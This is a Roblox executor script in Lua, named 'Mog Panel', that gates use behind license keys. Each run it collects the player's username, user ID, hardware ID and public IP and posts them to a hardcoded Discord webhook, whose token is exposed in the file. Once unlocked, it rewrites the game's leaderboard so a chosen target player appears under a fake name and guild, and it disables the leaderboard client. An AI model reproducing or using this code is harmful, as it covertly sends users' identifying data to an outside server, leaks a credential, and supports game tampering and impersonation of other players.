-- ========== MOG PANEL CORE WITH DISCORD LOGS ==========
local plr = game.Players.LocalPlayer or game:GetService("Players").LocalPlayer

-- ========== НАСТРОЙКИ ==========
local webhookURL = "https://discord.com/api/webhooks/1513876561252585503/TNaiMTX6eST5jthR6_ATaahPvX-R-X1Yu_FiE0H6yUVR4GCpspPZabPeDjez5TzvFLrP"  -- ВАШ ВЕБХУК

-- ========== ВАЛИДНЫЕ КЛЮЧИ И ИХ ВЛАДЕЛЬЦЫ ==========
-- Формат: {ключ}
local validKeys = {
    {"MOG7X-9K2P4-1L8N5-3V6M2", "", "User1", "@user1"},
    {"ROK4A-7C3E9-2W5Q8-6B1T7", "", "User2", "@user2"},
    {"PAN3D-5F8H1-9J4L7-2K6N9", "", "User3", "@user3"},
    {"KEYS8-4M2V6-1X9C3-7B5R0", "", "User4", "@user4"},
    {"CODE2-6Q4W8-3Z7L1-9F5H4", "", "User5", "@user5"},
}

-- ========== ПОЛУЧЕНИЕ HWID ==========
local function getHWID()
    local hwid = ""
    pcall(function()
        if syn and syn.getHWID then
            hwid = syn.getHWID()
        elseif getexecutorname then
            hwid = getexecutorname() .. "-" .. game:GetService("RbxAnalyticsService"):GetClientId()
        else
            hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        end
    end)
    if hwid == "" then
        hwid = "Unknown-" .. game:GetService("RbxAnalyticsService"):GetClientId()
    end
    return hwid
end

-- ========== ПОЛУЧЕНИЕ IP АДРЕСА ==========
local function getIP()
    local ip = "Unknown"
    pcall(function()
        local request = syn and syn.request or http and http.request or request
        if request then
            local response = request({
                Url = "https://api.ipify.org",
                Method = "GET"
            })
            if response and response.Body then
                ip = response.Body
            end
        end
    end)
    
    if ip == "Unknown" then
        pcall(function()
            local request = syn and syn.request or http and http.request or request
            if request then
                local response = request({
                    Url = "https://icanhazip.com",
                    Method = "GET"
                })
                if response and response.Body then
                    ip = string.gsub(response.Body, "%s+", "")
                end
            end
        end)
    end
    return ip
end

-- ========== ОТПРАВКА В DISCORD ==========
local function sendToDiscord(title, color, fields)
    local embed = {
        title = title,
        color = color,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = fields,
        footer = {text = "Mog Panel Security System"}
    }
    
    local data = {
        username = "Mog Panel Security",
        avatar_url = "https://i.imgur.com/4M2iC5c.png",
        embeds = {embed}
    }
    
    local encodedData = game:GetService("HttpService"):JSONEncode(data)
    
    pcall(function()
        local request = syn and syn.request or http and http.request or request
        if request then
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = encodedData
            })
        end
    end)
end

-- ========== ИЗВЛЕКАЕМ КЛЮЧ ИЗ АРГУМЕНТОВ ==========
local args = {...}
local userKey = args[1] or ""

-- ========== ПОЛУЧАЕМ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ ==========
local userHWID = getHWID()
local userIP = getIP()
local userProfileLink = "https://www.roblox.com/users/" .. plr.UserId .. "/profile"

-- ========== ПРОВЕРКА КЛЮЧА ==========
local keyData = nil
local keyOwner = nil
local keyDiscord = nil

for _, data in ipairs(validKeys) do
    if data[1] == userKey then
        keyData = data
        keyOwner = data[3]
        keyDiscord = data[4]
        break
    end
end

-- ========== ЛОГИРУЕМ ПОПЫТКУ АКТИВАЦИИ ==========
local attemptFields = {
    {name = "👤 Roblox User", value = "**Username:** " .. plr.Name .. "\n**Display:** " .. plr.DisplayName .. "\n**User ID:** " .. plr.UserId .. "\n**Profile:** [Click Here](" .. userProfileLink .. ")", inline = false},
    {name = "🔑 Key Used", value = "```" .. userKey .. "```", inline = false},
    {name = "🖥️ HWID", value = "```" .. userHWID .. "```", inline = false},
    {name = "🌐 IP Address", value = "```" .. userIP .. "```", inline = false},
    {name = "📅 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false},
}

-- ========== ПРОВЕРКА НА ПРИВЯЗКУ ==========
local isFirstTime = false
local ipMismatch = false

if keyData then
    local boundIP = keyData[2]
    
    if boundIP == "" then
        -- Первая активация - привязываем IP
        keyData[2] = userIP
        isFirstTime = true
        sendToDiscord("🔐 FIRST ACTIVATION - " .. plr.Name, 0xFFA500, attemptFields)
    elseif boundIP == userIP then
        -- Тот же пользователь
        sendToDiscord("✅ KEY ACTIVATED - " .. plr.Name, 0x00FF00, attemptFields)
    else
        -- Другой IP! Кто-то пытается использовать чужой ключ
        ipMismatch = true
        local mismatchFields = {
            {name = "⚠️ SECURITY ALERT", value = "Someone is trying to use a key from a different IP!", inline = false},
            {name = "👤 Roblox User", value = "**Username:** " .. plr.Name .. "\n**User ID:** " .. plr.UserId .. "\n**Profile:** [Click Here](" .. userProfileLink .. ")", inline = false},
            {name = "🔑 Key", value = "```" .. userKey .. "```", inline = false},
            {name = "🔒 Key Owner", value = "**Owner:** " .. keyOwner .. "\n**Discord:** " .. keyDiscord, inline = false},
            {name = "🌐 Current IP", value = "```" .. userIP .. "```", inline = false},
            {name = "🔐 Bound IP", value = "```" .. boundIP .. "```", inline = false},
            {name = "🖥️ HWID", value = "```" .. userHWID .. "```", inline = false},
        }
        sendToDiscord("🚨 SECURITY ALERT - IP MISMATCH", 0xFF0000, mismatchFields)
    end
else
    -- Неверный ключ
    sendToDiscord("❌ INVALID KEY ATTEMPT - " .. plr.Name, 0xFF0000, attemptFields)
end

-- ========== ЕСЛИ ПРОВЕРКА НЕ ПРОЙДЕНА ==========
if not keyData or ipMismatch then
    local errorGui = Instance.new("ScreenGui")
    errorGui.Name = "Error"
    errorGui.Parent = plr.PlayerGui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 200)
    frame.Position = UDim2.new(0.5, -200, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    frame.BorderSizePixel = 0
    frame.Parent = errorGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    title.Text = ipMismatch and "KEY ALREADY IN USE" or "INVALID KEY"
    title.TextColor3 = Color3.fromRGB(255, 60, 60)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = frame
    
    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(1, -20, 0, 60)
    msg.Position = UDim2.new(0, 10, 0, 60)
    msg.BackgroundTransparency = 1
    if ipMismatch then
        msg.Text = "This key is already activated on another device.\n\nIf this is a mistake, contact support with your HWID:\n" .. userHWID
    else
        msg.Text = "The license key you entered is invalid.\n\nPlease check your key and try again."
    end
    msg.TextColor3 = Color3.fromRGB(180, 180, 180)
    msg.TextSize = 12
    msg.Font = Enum.Font.Gotham
    msg.TextWrapped = true
    msg.Parent = frame
    
    local hwidLabel = Instance.new("TextLabel")
    hwidLabel.Size = UDim2.new(1, -20, 0, 30)
    hwidLabel.Position = UDim2.new(0, 10, 0, 130)
    hwidLabel.BackgroundTransparency = 1
    hwidLabel.Text = "HWID: " .. userHWID
    hwidLabel.TextColor3 = Color3.fromRGB(100, 100, 120)
    hwidLabel.TextSize = 10
    hwidLabel.Font = Enum.Font.Gotham
    hwidLabel.Parent = frame
    
    wait(5)
    errorGui:Destroy()
    return
end

-- ========== ПРИВЕТСТВИЕ ==========
local welcomeFields = {
    {name = "👤 Roblox User", value = "**Username:** " .. plr.Name .. "\n**Display:** " .. plr.DisplayName .. "\n**User ID:** " .. plr.UserId .. "\n**Profile:** [Click Here](" .. userProfileLink .. ")", inline = false},
    {name = "🔑 Key Owner", value = "**Owner:** " .. keyOwner .. "\n**Discord:** " .. keyDiscord, inline = false},
    {name = "🖥️ HWID", value = "```" .. userHWID .. "```", inline = false},
    {name = "🌐 IP Address", value = "```" .. userIP .. "```", inline = false},
}

if isFirstTime then
    welcomeFields[#welcomeFields + 1] = {name = "🔒 Key Bound", value = "This key is now locked to your IP/HWID", inline = false}
end

sendToDiscord("🟢 MOG PANEL ACTIVATED - " .. plr.Name, 0x00FF00, welcomeFields)

-- ========== ЭКРАН ЗАГРУЗКИ ==========
local splashGui = Instance.new("ScreenGui")
splashGui.Name = "Splash"
splashGui.ResetOnSpawn = false
splashGui.Parent = plr.PlayerGui

local splashText = Instance.new("TextLabel")
splashText.Size = UDim2.new(0, 400, 0, 60)
splashText.Position = UDim2.new(0.5, -200, 0.5, -30)
splashText.BackgroundTransparency = 1
splashText.Text = "Mog whoever u want"
splashText.TextColor3 = Color3.fromRGB(255, 255, 255)
splashText.TextSize = 28
splashText.Font = Enum.Font.GothamBold
splashText.TextTransparency = 1
splashText.Parent = splashGui

for i = 1, 20 do
    splashText.TextTransparency = 1 - (i / 20)
    wait(0.025)
end

local startColor = Color3.fromRGB(255, 255, 255)
local endColor = Color3.fromRGB(139, 0, 0)

for i = 1, 30 do
    local t = i / 30
    local r = startColor.R + (endColor.R - startColor.R) * t
    local g = startColor.G + (endColor.G - startColor.G) * t
    local b = startColor.B + (endColor.B - startColor.B) * t
    splashText.TextColor3 = Color3.new(r, g, b)
    wait(0.033)
end

wait(0.5)

for i = 1, 20 do
    splashText.TextTransparency = i / 20
    wait(0.025)
end

splashGui:Destroy()
wait(0.2)

-- ========== ОСНОВНОЕ МЕНЮ ==========
local GuildName = "Dickheads"
local ManForBan = "Rivers Sekhigi"
local NameForBan = "SigmaTolik"
local DisplayForBan = "OtherTolik"
local status = "Leader"

local FrameConnections = {}

local function clearFrameConnections(frame)
    if FrameConnections[frame] then
        if FrameConnections[frame].Enter then
            FrameConnections[frame].Enter:Disconnect()
        end
        if FrameConnections[frame].Leave then
            FrameConnections[frame].Leave:Disconnect()
        end
        FrameConnections[frame] = nil
    end
end

local gui = Instance.new("ScreenGui")
gui.Name = "MogPanel"
gui.ResetOnSpawn = false
gui.Parent = plr.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 320, 0, 420)
frame.Position = UDim2.new(0.5, -160, 0.5, -210)
frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
frame.BackgroundTransparency = 0
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = gui

local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 10, 1, 10)
shadow.Position = UDim2.new(0, -5, 0, -5)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.6
shadow.BorderSizePixel = 0
shadow.ZIndex = 0
shadow.Parent = frame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(35, 35, 40)
stroke.Thickness = 1
stroke.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 48)
title.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
title.BackgroundTransparency = 0
title.Text = "MOG PANEL"
title.TextColor3 = Color3.fromRGB(200, 200, 210)
title.Font = Enum.Font.GothamBold
title.TextSize = 15
title.Parent = frame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = title

local line = Instance.new("Frame")
line.Size = UDim2.new(1, -24, 0, 1)
line.Position = UDim2.new(0, 12, 0, 48)
line.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
line.BorderSizePixel = 0
line.Parent = frame

local contentContainer = Instance.new("Frame")
contentContainer.Size = UDim2.new(1, 0, 1, -48)
contentContainer.Position = UDim2.new(0, 0, 0, 48)
contentContainer.BackgroundTransparency = 1
contentContainer.Parent = frame

local UIS = game:GetService("UserInputService")
local dragging = false
local dragStart
local startPos

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

local function CreateModernBox(y, text, defaultValue)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -24, 0, 58)
    container.Position = UDim2.new(0, 12, 0, y)
    container.BackgroundTransparency = 1
    container.Parent = contentContainer
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 18)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextColor3 = Color3.fromRGB(130, 130, 145)
    label.TextSize = 11
    label.Font = Enum.Font.Gotham
    label.Parent = container
    
    local box = Instance.new("TextBox")
    box.Size = UDim2.new(1, 0, 0, 34)
    box.Position = UDim2.new(0, 0, 0, 20)
    box.BackgroundColor3 = Color3.fromRGB(22, 22, 27)
    box.BackgroundTransparency = 0
    box.TextColor3 = Color3.fromRGB(210, 210, 220)
    box.Text = defaultValue
    box.TextSize = 12
    box.Font = Enum.Font.Gotham
    box.ClearTextOnFocus = false
    box.Parent = container
    
    local boxCorner = Instance.new("UICorner")
    boxCorner.CornerRadius = UDim.new(0, 6)
    boxCorner.Parent = box
    
    local boxStroke = Instance.new("UIStroke")
    boxStroke.Color = Color3.fromRGB(40, 40, 47)
    boxStroke.Thickness = 1
    boxStroke.Parent = box
    
    return box
end

local GuildBox = CreateModernBox(10, "GUILD NAME", GuildName)
local PlayerBox = CreateModernBox(74, "TARGET PLAYER", ManForBan)
local NameBox = CreateModernBox(138, "FAKE NAME", NameForBan)
local DisplayBox = CreateModernBox(202, "FAKE DISPLAY", DisplayForBan)
local StatusBox = CreateModernBox(266, "STATUS", status)

local apply = Instance.new("TextButton")
apply.Size = UDim2.new(0.45, -6, 0, 40)
apply.Position = UDim2.new(0, 12, 1, -52)
apply.Text = "APPLY"
apply.BackgroundColor3 = Color3.fromRGB(35, 75, 45)
apply.BackgroundTransparency = 0
apply.TextColor3 = Color3.new(1, 1, 1)
apply.TextSize = 12
apply.Font = Enum.Font.GothamBold
apply.Parent = contentContainer

local applyCorner = Instance.new("UICorner")
applyCorner.CornerRadius = UDim.new(0, 6)
applyCorner.Parent = apply

local hide = Instance.new("TextButton")
hide.Size = UDim2.new(0.45, -6, 0, 40)
hide.Position = UDim2.new(0.55, 0, 1, -52)
hide.Text = "HIDE"
hide.BackgroundColor3 = Color3.fromRGB(65, 45, 45)
hide.BackgroundTransparency = 0
hide.TextColor3 = Color3.new(1, 1, 1)
hide.TextSize = 12
hide.Font = Enum.Font.GothamBold
hide.Parent = frame

local hideCorner = Instance.new("UICorner")
hideCorner.CornerRadius = UDim.new(0, 6)
hideCorner.Parent = hide

local function RefreshLeaderboard()
    local leaderboardGui = plr.PlayerGui:FindFirstChild("LeaderboardGui")
    if not leaderboardGui then return end
    
    local mainFrame = leaderboardGui:FindFirstChild("MainFrame")
    if not mainFrame then return end
    
    local frm = mainFrame:FindFirstChild("ScrollingFrame")
    if not frm then return end
    
    local descendants = frm:GetDescendants()
    for _, z in ipairs(descendants) do
        if z:IsA("TextButton") and z.Name == "PlayerFrame" then
            clearFrameConnections(z)
            
            local playerFrame = z:FindFirstChild("PlayerFrame")
            if playerFrame then
                local Player = playerFrame:FindFirstChild("Player")
                if Player then
                    local DeepName = Player.Text
                    
                    if DeepName == nil then
                        z:Destroy()
                    else
                        local guildFrame = z:FindFirstChild("GuildFrame")
                        local Guild = guildFrame and guildFrame:FindFirstChild("Guild")
                        
                        local plrName = nil
                        local DisplayNamez = nil
                        
                        local live = workspace:FindFirstChild("Live")
                        if live then
                            local children = live:GetChildren()
                            for _, v in ipairs(children) do
                                local humanoid = v:FindFirstChild("Humanoid")
                                if humanoid then
                                    local attrName = humanoid:GetAttribute("CharacterName")
                                    if attrName == DeepName then
                                        local playerObj = game.Players:FindFirstChild(v.Name)
                                        if playerObj then
                                            plrName = v.Name
                                            DisplayNamez = playerObj.DisplayName
                                            break
                                        end
                                    end
                                end
                            end
                        end
                        
                        if DeepName == ManForBan then
                            if Guild then
                                Guild.Text = GuildName
                            end
                            
                            if plrName and live and live:FindFirstChild(plrName) then
                                local hum = live[plrName]:FindFirstChild("Humanoid")
                                if hum then
                                    hum:SetAttribute("GuildRich", GuildName .. " - " .. status)
                                end
                            end
                            
                            local enterConn = z.MouseEnter:Connect(function()
                                local Name = NameForBan
                                local DisplayName = DisplayForBan
                                if DisplayName ~= Name and DisplayName ~= "" then
                                    Name = Name .. (" (%s)"):format(DisplayName)
                                end
                                Player.Text = Name
                                Player.TextTransparency = 0.3
                                if Guild then Guild.TextTransparency = 0.3 end
                            end)
                            
                            local leaveConn = z.MouseLeave:Connect(function()
                                Player.Text = DeepName
                                Player.TextTransparency = 0
                                if Guild then Guild.TextTransparency = 0 end
                            end)
                            
                            FrameConnections[z] = {
                                Enter = enterConn,
                                Leave = leaveConn
                            }
                        else
                            if DeepName ~= nil and DeepName ~= ManForBan then
                                local enterConn = z.MouseEnter:Connect(function()
                                    local Name = plrName or DeepName
                                    local DisplayName = DisplayNamez or ""
                                    if DisplayName ~= Name and DisplayName ~= "" then
                                        Name = Name .. (" (%s)"):format(DisplayName)
                                    end
                                    Player.Text = Name
                                    Player.TextTransparency = 0.3
                                    if Guild then Guild.TextTransparency = 0.3 end
                                end)
                                
                                local leaveConn = z.MouseLeave:Connect(function()
                                    Player.Text = DeepName
                                    Player.TextTransparency = 0
                                    if Guild then Guild.TextTransparency = 0 end
                                end)
                                
                                FrameConnections[z] = {
                                    Enter = enterConn,
                                    Leave = leaveConn
                                }
                            end
                        end
                    end
                end
            end
        end
    end
end

apply.MouseButton1Click:Connect(function()
    GuildName = GuildBox.Text
    ManForBan = PlayerBox.Text
    NameForBan = NameBox.Text
    DisplayForBan = DisplayBox.Text
    status = StatusBox.Text
    
    RefreshLeaderboard()
end)

local hidden = false
hide.MouseButton1Click:Connect(function()
    hidden = not hidden
    contentContainer.Visible = not hidden
    hide.Text = hidden and "SHOW" or "HIDE"
    frame.Size = hidden and UDim2.new(0, 320, 0, 48) or UDim2.new(0, 320, 0, 420)
end)

local function Start()
    repeat 
        wait(0.5) 
    until plr.PlayerGui:FindFirstChild("LeaderboardGui")
    
    RefreshLeaderboard()
    
    wait(0.4)
    local leaderboardGui = plr.PlayerGui:FindFirstChild("LeaderboardGui")
    if leaderboardGui then
        local leaderboardClient = leaderboardGui:FindFirstChild("LeaderboardClient")
        if leaderboardClient then
            leaderboardClient.Enabled = false
        end
    end
    
    local leaderboardGui = plr.PlayerGui:FindFirstChild("LeaderboardGui")
    if leaderboardGui then
        local mainFrame = leaderboardGui:FindFirstChild("MainFrame")
        if mainFrame then
            local frm = mainFrame:FindFirstChild("ScrollingFrame")
            if frm then
                frm.ChildAdded:Connect(function()
                    task.wait(0.1)
                    RefreshLeaderboard()
                end)
            end
        end
    end
end

Start()
